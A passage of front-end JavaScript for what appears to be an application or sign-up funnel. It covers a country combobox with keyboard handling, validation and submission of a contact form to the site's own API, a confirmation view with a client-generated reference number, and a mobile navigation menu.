    }).join('');
    comboActiveIdx = items.length ? 0 : -1;
    updateActive();
  };

  const updateActive = () => {
    $$('li', list).forEach((li, i) => {
      li.classList.toggle('is-active', i === comboActiveIdx);
    });
    const active = list.querySelector('li.is-active');
    if (active) active.scrollIntoView({ block: 'nearest' });
  };

  const open = () => {
    list.hidden = false;
    input.setAttribute('aria-expanded', 'true');
    render(input.value === hidden.value ? '' : input.value);
  };
  const close = () => {
    list.hidden = true;
    input.setAttribute('aria-expanded', 'false');
    // If the typed value isn't an exact match, revert to the stored value.
    if (input.value !== hidden.value) {
      input.value = hidden.value || '';
    }
  };

  const commit = (value) => {
    hidden.value = value;
    input.value = value;
    list.hidden = true;
    input.setAttribute('aria-expanded', 'false');
  };

  input.addEventListener('focus', open);
  input.addEventListener('input', () => { open(); render(input.value); });
  input.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowDown') { e.preventDefault(); if (list.hidden) open(); else { comboActiveIdx = Math.min(comboActiveIdx + 1, list.children.length - 1); updateActive(); } }
    else if (e.key === 'ArrowUp') { e.preventDefault(); comboActiveIdx = Math.max(comboActiveIdx - 1, 0); updateActive(); }
    else if (e.key === 'Enter') {
      const active = list.querySelector('li.is-active');
      if (active) { e.preventDefault(); commit(active.dataset.value); }
    }
    else if (e.key === 'Escape') { close(); input.blur(); }
  });
  toggle.addEventListener('click', (e) => {
    e.preventDefault();
    if (list.hidden) { input.focus(); open(); } else close();
  });
  list.addEventListener('mousedown', (e) => {
    // mousedown so we fire before input's blur.
    const li = e.target.closest('li[data-value]');
    if (!li) return;
    e.preventDefault();
    commit(li.dataset.value);
  });
  document.addEventListener('click', (e) => {
    if (list.hidden) return;
    const combo = $('#m-country-combo');
    if (combo && !combo.contains(e.target)) close();
  });
}

async function onContactSubmit(e) {
  e.preventDefault();
  const form = e.currentTarget;
  const name = form.name.value.trim();
  const phone = form.phone.value.trim();
  const email = form.email.value.trim();
  const addressLine1 = form.addressLine1.value.trim();
  const addressLine2 = form.addressLine2.value.trim();
  const zip = form.zip.value.trim();
  const state = form.state.value.trim();
  const country = form.country.value.trim();
  const err = $('#m-form-err');

  if (name.length < 2) return showFormError('Please enter your full name.');
  if (phone.length < 5) return showFormError('Please enter a valid contact number.');
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return showFormError('Please enter a valid mail ID.');
  if (addressLine1.length < 3) return showFormError('Please enter address line 1.');
  if (zip.length < 2) return showFormError('Please enter a ZIP / postal code.');
  if (!state) return showFormError('Please enter your state.');
  if (!country) return showFormError('Please select your country.');
  err.hidden = true;

  const submitBtn = $('#m-submit-contact');
  submitBtn.disabled = true;
  submitBtn.textContent = 'Submitting…';

  try {
    const res = await fetch(BASE + '/api/front/contact', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        connectionId: connId,
        name,
        phone,
        email,
        addressLine1,
        addressLine2,
        zip,
        state,
        country
      }),
    });
    const data = await res.json();
    if (!res.ok || data.error) throw new Error(data.error || 'submission failed');
    showConfirmed();
  } catch (ex) {
    submitBtn.disabled = false;
    submitBtn.textContent = 'Submit application';
    showFormError(ex.message || 'Something went wrong. Please try again.');
  }
}

function showFormError(msg) {
  const err = $('#m-form-err');
  err.textContent = msg;
  err.hidden = false;
}

/* ========== Step 4: confirmation ========== */
function showConfirmed() {
  track('CompleteRegistration', Object.assign({ status: true }, FUNNEL_CONTENT));
  setView('done');
  $('#ref-number').textContent = generateReference();
  $('#ref-date').textContent = formatDate(new Date());
}

function generateReference() {
  const rand = Math.floor(Math.random() * 0xffffffff).toString(16).toUpperCase().padStart(8, '0');
  const ts = Date.now().toString(36).toUpperCase().slice(-4);
  return `TC-${rand.slice(0, 4)}-${rand.slice(4)}-${ts}`;
}

function formatDate(d) {
  const opts = { year: 'numeric', month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' };
  return d.toLocaleString('en-GB', opts);
}

/* ========== Mobile nav menu ========== */
const burger = $('[data-menu-toggle]');
const navMobile = $('#nav-mobile');
if (burger && navMobile) {
  const setOpen = (open) => {
    document.body.classList.toggle('nav-open', open);
    burger.setAttribute('aria-expanded', open ? 'true' : 'false');
    burger.setAttribute('aria-label', open ? 'Close menu' : 'Open menu');
    if (open) navMobile.removeAttribute('hidden');
    else setTimeout(() => { if (!document.body.classList.contains('nav-open')) navMobile.setAttribute('hidden', ''); }, 260);
  };
  burger.addEventListener('click', () => {
    setOpen(!document.body.classList.contains('nav-open'));
  });
  navMobile.querySelectorAll('[data-menu-link]').forEach((el) => {
    el.addEventListener('click', () => setOpen(false));
  });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && document.body.classList.contains('nav-open')) setOpen(false);
  });
}
